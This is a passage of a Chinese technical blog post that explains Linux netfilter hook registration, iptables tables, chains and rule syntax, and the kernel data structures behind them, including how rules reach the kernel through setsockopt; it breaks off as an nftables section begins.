class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> nf_hook_entries *<br><span class="hljs-title function_">nf_hook_entries_grow</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nf_hook_entries *old,</span><br><span class="hljs-params">     <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nf_hook_ops *reg)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i, alloc_entries, nhooks, old_entries;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_ops</span> **<span class="hljs-title">orig_ops</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_ops</span> **<span class="hljs-title">new_ops</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entries</span> *<span class="hljs-title">new</span>;</span><br><span class="hljs-type">bool</span> inserted = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 1. 获取原来的nf_hook_entries中有效的nf_hook_ops数量</span><br><span class="hljs-comment">     */</span><br>alloc_entries = <span class="hljs-number">1</span>;<br>old_entries = old ? old-&gt;num_hook_entries : <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (old) &#123;<br>orig_ops = nf_hook_entries_get_hook_ops(old);<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; old_entries; i++) &#123;<br><span class="hljs-keyword">if</span> (orig_ops[i] != &amp;dummy_ops)<br>alloc_entries++;<br>&#125;<br>&#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 2. 为新的nf_hook_entries分配空间</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">if</span> (alloc_entries &gt; MAX_HOOK_COUNT)<br><span class="hljs-keyword">return</span> ERR_PTR(-E2BIG);<br><br>new = allocate_hook_entries_size(alloc_entries);<br><span class="hljs-keyword">if</span> (!new)<br><span class="hljs-keyword">return</span> ERR_PTR(-ENOMEM);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 3. 将原来nf_hook_entries中有效的nf_hook_ops和nf_hook_entry项复制过来</span><br><span class="hljs-comment">     *    根据priority插入新的hook项</span><br><span class="hljs-comment">     */</span><br>new_ops = nf_hook_entries_get_hook_ops(new);<br><br>i = <span class="hljs-number">0</span>;<br>nhooks = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (i &lt; old_entries) &#123;<br><span class="hljs-keyword">if</span> (orig_ops[i] == &amp;dummy_ops) &#123;<br>++i;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (inserted || reg-&gt;priority &gt; orig_ops[i]-&gt;priority) &#123;<br>new_ops[nhooks] = (<span class="hljs-type">void</span> *)orig_ops[i];<br>new-&gt;hooks[nhooks] = old-&gt;hooks[i];<br>i++;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>new_ops[nhooks] = (<span class="hljs-type">void</span> *)reg;<br>new-&gt;hooks[nhooks].hook = reg-&gt;hook;<br>new-&gt;hooks[nhooks].priv = reg-&gt;priv;<br>inserted = <span class="hljs-literal">true</span>;<br>&#125;<br>nhooks++;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!inserted) &#123;<br>new_ops[nhooks] = (<span class="hljs-type">void</span> *)reg;<br>new-&gt;hooks[nhooks].hook = reg-&gt;hook;<br>new-&gt;hooks[nhooks].priv = reg-&gt;priv;<br>&#125;<br><br><span class="hljs-keyword">return</span> new;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>nf_hook_entries_get_hook_ops函数用于从nf_hook_entries中定位nf_hook_ops指针数组的位置（存在nf_hook_entry数组之后）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> nf_hook_ops **<span class="hljs-title function_">nf_hook_entries_get_hook_ops</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nf_hook_entries *e)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> n = e-&gt;num_hook_entries;<br><span class="hljs-type">const</span> <span class="hljs-type">void</span> *hook_end;<br><br>hook_end = &amp;e-&gt;hooks[n]; <span class="hljs-comment">/* this is *past* -&gt;hooks[]! */</span><br><br><span class="hljs-keyword">return</span> (<span class="hljs-keyword">struct</span> nf_hook_ops **)hook_end;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>allocate_hook_entries_size申请空间，nf_hook_entries实际上包含</p><ul><li>num_hook_entries项</li><li>一个nf_hook_entry数组</li><li>一个nf_hook_ops指针数组</li></ul><p>nf_hook_entry数组和nf_hook_ops指针数组中的项一一对应</p><p><em>还有一个rcu的结构，先忽略(～o￣3￣)～</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> nf_hook_entries *<span class="hljs-title function_">allocate_hook_entries_size</span><span class="hljs-params">(u16 num)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entries</span> *<span class="hljs-title">e</span>;</span><br><span class="hljs-type">size_t</span> alloc = <span class="hljs-keyword">sizeof</span>(*e) +<br>       <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> nf_hook_entry) * num +<br>       <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> nf_hook_ops *) * num +<br>       <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> nf_hook_entries_rcu_head);<br><br><span class="hljs-keyword">if</span> (num == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>e = kvzalloc(alloc, GFP_KERNEL);<br><span class="hljs-keyword">if</span> (e)<br>e-&gt;num_hook_entries = num;<br><span class="hljs-keyword">return</span> e;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>更新后的结构应该是这样的👇</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/new_nf_hook.png" class title="new_nf_hook"><h1 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h1><p>由于某个强迫症非要把这条链全都捋一遍，工作量++</p><h2 id="iptables使用"><a href="#iptables使用" class="headerlink" title="iptables使用"></a>iptables使用</h2><h3 id="四表五链"><a href="#四表五链" class="headerlink" title="四表五链"></a>四表五链</h3><ul><li>四表（还有其他表比如security，忽略）<ul><li>filter：过滤，内核模块 <strong>iprables_filter</strong></li><li>nat：网络地址转换（目标ip或者源ip），内核模块 <strong>iptables_nat</strong></li><li>mangle：拆解报文，修改，重新封装，内核模块 <strong>iptables_mangle</strong></li><li>raw：关闭nat表上启用的连接追踪机制，内核模块 <strong>iptables_raw</strong></li></ul></li><li>五链（详情见上hook挂载👆）<ul><li>PREROUTING</li><li>INPUT</li><li>OUTPUT</li><li>FORWARD</li><li>POSTROUTING</li></ul></li></ul><p>表链关系，优先级向下递减</p><table><thead><tr><th>表 &#x2F; 链</th><th>PREROUTING</th><th>INPUT</th><th>OUTPUT</th><th>FORWARD</th><th>POSTROUTING</th></tr></thead><tbody><tr><td>raw</td><td>√</td><td></td><td>√</td><td></td><td></td></tr><tr><td>mangle</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>nat</td><td>√</td><td>√</td><td>√</td><td></td><td>√</td></tr><tr><td>filter</td><td></td><td>√</td><td>√</td><td>√</td><td></td></tr></tbody></table><h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><p>一条规则由 <strong>匹配条件（match）</strong> 和 <strong>处理动作（target）</strong> 构成，匹配条件又分为 <strong>基本匹配条件</strong> 和 <strong>扩展匹配条件</strong></p><ul><li>匹配条件<ul><li>基本匹配条件<ul><li>源IP</li><li>目的IP</li></ul></li><li>扩展匹配条件（通常以模块形式存在，模块可以按需安装）<ul><li>源端口</li><li>目标端口</li></ul></li></ul></li><li>处理动作<ul><li>ACCEPT：允许数据包通过</li><li>DROP：直接丢弃数据包，不给任何回应信息</li><li>REJECT：拒绝数据包通过，必要时会给数据发送端一个响应的信息，客户端刚请求就会收到拒绝的信息</li><li>SNAT：源地址转换，解决内网用户用同一个公网地址上网的问题</li><li>MASQUERADE：是SNAT的一种特殊形式，适用于动态的、临时会变的ip上</li><li>DNAT：目标地址转换</li><li>REDIRECT：在本机做端口映射</li><li>LOG：在&#x2F;var&#x2F;log&#x2F;messages文件中记录日志信息，然后将数据包传递给下一条规则，也就是说除了记录以外不对数据包做任何其他操作，仍然让下一条规则去匹配</li></ul></li></ul><h3 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">iptables [-t 表]<br>         命令选项<br>         [链]<br>         [匹配选项]<br>         [操作选项]<br></code></pre></td></tr></table></figure><ul><li><p>命令选项</p><table><thead><tr><th align="left">选项名</th><th align="left">功能及特点</th></tr></thead><tbody><tr><td align="left">-A –append</td><td align="left">在指定链的末尾添加一条新的规则</td></tr><tr><td align="left">-D –delete</td><td align="left">删除指定链中的某一条规则，按规则序号或内容确定要删除的规则</td></tr><tr><td align="left">-I –insert</td><td align="left">在指定链中插入一条新的规则，默认在链的开头插入</td></tr><tr><td align="left">-R –replace</td><td align="left">修改、替换指定链中的一条规则，按规则序号或内容确定</td></tr><tr><td align="left">-F –flush</td><td align="left">清空指定链中的所有规则，默认清空表中所有链的内容</td></tr><tr><td align="left">-N –new</td><td align="left">新建一条用户自己定义的规则链</td></tr><tr><td align="left">-X –delete-chain</td><td align="left">删除指定表中用户自定义的规则链</td></tr><tr><td align="left">-P –policy</td><td align="left">设置指定链的默认策略</td></tr><tr><td align="left">-F, –flush</td><td align="left">清空指定链上面的所有规则，如果没有指定链，清空表上所有链的所有规则</td></tr><tr><td align="left">-Z, –zero</td><td align="left">把指定链或表中的所有链上的所有计数器清零</td></tr><tr><td align="left">-L –list</td><td align="left">列出指定链中的所有的规则进行查看，默认列出表中所有链的内容</td></tr><tr><td align="left">-S –list-rules</td><td align="left">以原始格式列出链中所有规则</td></tr><tr><td align="left">-v –verbose</td><td align="left">查看规则列表时显示详细的信息</td></tr><tr><td align="left">-n –numeric</td><td align="left">用数字形式显示输出结果，如显示主机的 IP 地址而不是主机名</td></tr><tr><td align="left">–line-number</td><td align="left">查看规则列表时，同时显示规则在链中的顺序号</td></tr></tbody></table></li><li><p>匹配选项</p><table><thead><tr><th align="left">选项名</th><th align="left">功能及特点</th></tr></thead><tbody><tr><td align="left">-i –in-interface</td><td align="left">匹配输入接口，如 eth0，eth1</td></tr><tr><td align="left">-o –out-interface</td><td align="left">匹配输出接口</td></tr><tr><td align="left">-p –proto</td><td align="left">匹配协议类型，如 TCP、UDP 和 ICMP等</td></tr><tr><td align="left">-s –source</td><td align="left">匹配的源地址</td></tr><tr><td align="left">–sport</td><td align="left">匹配的源端口号</td></tr><tr><td align="left">-d –destination</td><td align="left">匹配的目的地址</td></tr><tr><td align="left">–dport</td><td align="left">匹配的目的端口号</td></tr><tr><td align="left">-m –match</td><td align="left">匹配规则所使用的过滤模块</td></tr></tbody></table></li><li><p>操作选项</p><p>般为 <strong>-j 处理动作</strong> 的形式，处理动作包括ACCEPT，DROP，RETURN，REJECT，DNAT，SNAT等</p></li></ul><h2 id="iptables相关源码"><a href="#iptables相关源码" class="headerlink" title="iptables相关源码"></a>iptables相关源码</h2><h3 id="iptables数据结构"><a href="#iptables数据结构" class="headerlink" title="iptables数据结构"></a>iptables数据结构</h3><p>回顾一下iptables命令的格式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">iptables [-t 表]<br>         命令选项<br>         [链]<br>         [匹配选项]<br>         [操作选项]<br></code></pre></td></tr></table></figure><p>再放一张图</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/table.png" class title="table"><p>接下来的结构体都对应着命令格式和图看</p><ul><li><p><strong>xt_table</strong> 表示“四表五链”中的表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_table</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> valid_hooks;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_table_info</span> *<span class="hljs-title">private</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_ops</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">module</span> *<span class="hljs-title">me</span>;</span><br><span class="hljs-type">u_int8_t</span> af;<br><span class="hljs-type">int</span> priority;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> name[XT_TABLE_MAXNAMELEN];<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p>list：xt_table以链表储存</p></li><li><p>valid_hooks：用掩码的方式表示有哪些hook，如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">.valid_hooks= (<span class="hljs-number">1</span> &lt;&lt; NF_INET_PRE_ROUTING) |<br>  (<span class="hljs-number">1</span> &lt;&lt; NF_INET_POST_ROUTING) |<br>  (<span class="hljs-number">1</span> &lt;&lt; NF_INET_LOCAL_OUT) |<br>  (<span class="hljs-number">1</span> &lt;&lt; NF_INET_LOCAL_IN),<br></code></pre></td></tr></table></figure></li><li><p>private：指向命令的描述结构体 <strong>xt_table_info</strong></p></li><li><p>ops：指向之前分析过的nf_hook_ops结构体</p></li><li><p>af：协议簇</p></li><li><p>priority：优先级</p></li><li><p>name：表名，如nat，filter，mangle</p></li></ul></li><li><p><strong>xt_table_info</strong> 表示表中的命令</p><p><em>注：所有的idx表示entries[]的index</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_table_info</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> number;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> initial_entries;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hook_entry[NF_INET_NUMHOOKS];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> underflow[NF_INET_NUMHOOKS];<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> stacksize;<br><span class="hljs-type">void</span> ***jumpstack;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> entries[] __aligned(<span class="hljs-number">8</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>size：table的大小</li><li>number：包含的entry个数，命令的条数</li><li>initial_entries：table的起始idx</li><li>hook_entry：每一条链的起始idx</li><li>underflow：每一条链的结束idx</li><li>stacksize：栈大小</li><li>jumpstack：等同于 jumpstack[cpuid][entry*]<ul><li>当命令中发生了jump（A→B）时：push A-&gt;idx</li><li>当命令的target为RETURN时：pop A-&gt;idx，继续执行</li></ul></li><li>entries：<strong>ipt_entry</strong> 数组，一个entry表示一条命令</li></ul></li><li><p><strong>ipt_entry</strong> 一个entry表示一条命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_entry</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_ip</span> <span class="hljs-title">ip</span>;</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nfcache;<br><br>__u16 target_offset;<br>__u16 next_offset;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> comefrom;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_counters</span> <span class="hljs-title">counters</span>;</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> elems[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>ip：基本匹配IP</li><li>target_offset：target元素的地址，<strong>elems + sizeof(xt_match) * numof(matchs)</strong></li><li>next_offset：下一个ipt_entry的地址</li><li>comefrom：从哪个entry来的</li><li>counters：packet和byte的计数器</li><li>elems：保存了 <strong>xt_match</strong> 和 <strong>xt_target</strong><ul><li>elems的地址即xt_match的地址</li><li>xt_target的地址由target_offset指定</li></ul></li></ul></li></ul><h3 id="xt-table和net的连接"><a href="#xt-table和net的连接" class="headerlink" title="xt_table和net的连接"></a>xt_table和net的连接</h3><p>我们从 <strong>xt_register_table</strong> 中可以窥见 <strong>xt_table</strong> 是怎么储存在 <strong>网络命名空间 net 结构体</strong> 中的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> xt_table *<span class="hljs-title function_">xt_register_table</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> xt_table *input_table,</span><br><span class="hljs-params">   <span class="hljs-keyword">struct</span> xt_table_info *bootstrap,</span><br><span class="hljs-params">   <span class="hljs-keyword">struct</span> xt_table_info *newinfo)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_pernet</span> *<span class="hljs-title">xt_net</span> =</span> net_generic(net, xt_pernet_id);<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_table</span> *<span class="hljs-title">t</span>, *<span class="hljs-title">table</span>;</span><br>    <br>list_add(&amp;table-&gt;<span class="hljs-built_in">list</span>, &amp;xt_net-&gt;tables[table-&gt;af]);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>xt_table在net中的存储依赖成员 <strong>gen</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span> &#123;</span><br>    <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_generic</span> __<span class="hljs-title">rcu</span>*<span class="hljs-title">gen</span>;</span><br><br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>net_generic结构体和xt_pernet结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_generic</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu</span>;</span><br>&#125; s;<br><br><span class="hljs-type">void</span> *ptr[<span class="hljs-number">0</span>];<br>&#125;;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_pernet</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">tables</span>[<span class="hljs-title">NFPROTO_NUMPROTO</span>];</span><br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>net_generic函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">net_generic</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> net *net, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> id)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_generic</span> *<span class="hljs-title">ng</span>;</span><br><span class="hljs-type">void</span> *ptr;<br><br>rcu_read_lock();<br>ng = rcu_dereference(net-&gt;gen);<br>ptr = ng-&gt;ptr[id];<br>rcu_read_unlock();<br><br><span class="hljs-keyword">return</span> ptr;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>不考虑rcu的话其实就是</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/gen.png" class title="gen"></li></ul><h3 id="xt-table和hook的注册"><a href="#xt-table和hook的注册" class="headerlink" title="xt_table和hook的注册"></a>xt_table和hook的注册</h3><p>四表都有各自的内核模块，以filter为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">module_init(iptable_filter_init);<br>module_exit(iptable_filter_fini);<br></code></pre></td></tr></table></figure><p><strong>iptable_filter_init</strong> 的函数调用关系图</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/function1.png" class title="function1"><ul><li><p>上文已经提到了，xt_table的注册在 <strong>xt_register_table</strong> 中完成</p></li><li><p>hooks的注册在 <strong>nf_register_net_hooks</strong> 中完成</p><p>在Netfilter中已经介绍过了 <strong>nf_register_net_hook</strong>，nf_register_net_hooks其实就是一次注册多个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">nf_register_net_hooks</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nf_hook_ops *reg,</span><br><span class="hljs-params">  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> n)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br><span class="hljs-type">int</span> err = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>err = nf_register_net_hook(net, &amp;reg[i]);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">goto</span> err;<br>&#125;<br><span class="hljs-keyword">return</span> err;<br><br>err:<br><span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span>)<br>nf_unregister_net_hooks(net, reg, i);<br><span class="hljs-keyword">return</span> err;<br>&#125;<br>EXPORT_SYMBOL(nf_register_net_hooks);<br></code></pre></td></tr></table></figure></li></ul><h3 id="用户态和内核态的消息传递"><a href="#用户态和内核态的消息传递" class="headerlink" title="用户态和内核态的消息传递"></a>用户态和内核态的消息传递</h3><p>我们可以使用iptables命令行自定义命令，那我们自定义的命令是怎么传递给内核的呢(・∀・(・∀・(・∀・*)</p><p><em>用户态的iptables源码可以看出来</em></p><p><strong>TC_COMMIT</strong> 函数利用 <strong>setsockopt</strong> 向内核提交数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">TC_COMMIT</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> xtc_handle *handle)</span><br>&#123;<br>    <br>    ret = setsockopt(handle-&gt;sockfd, TC_IPPROTO, SO_SET_REPLACE, repl,<br>             <span class="hljs-keyword">sizeof</span>(*repl) + repl-&gt;size);<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>repl类型是 <strong>ipt_replace</strong>，可以看出来和xt_table相似度很高</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_replace</span> &#123;</span><br><span class="hljs-type">char</span> name[XT_TABLE_MAXNAMELEN];<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> valid_hooks;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num_entries;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hook_entry[NF_INET_NUMHOOKS];<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> underflow[NF_INET_NUMHOOKS];<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num_counters;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_counters</span> __<span class="hljs-title">user</span> *<span class="hljs-title">counters</span>;</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_entry</span> <span class="hljs-title">entries</span>[0];</span><br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="nftables"><a href="#nftables" class="headerlink" title="nftables"></a>nftables</h1><h2 id="nftables使用"><a 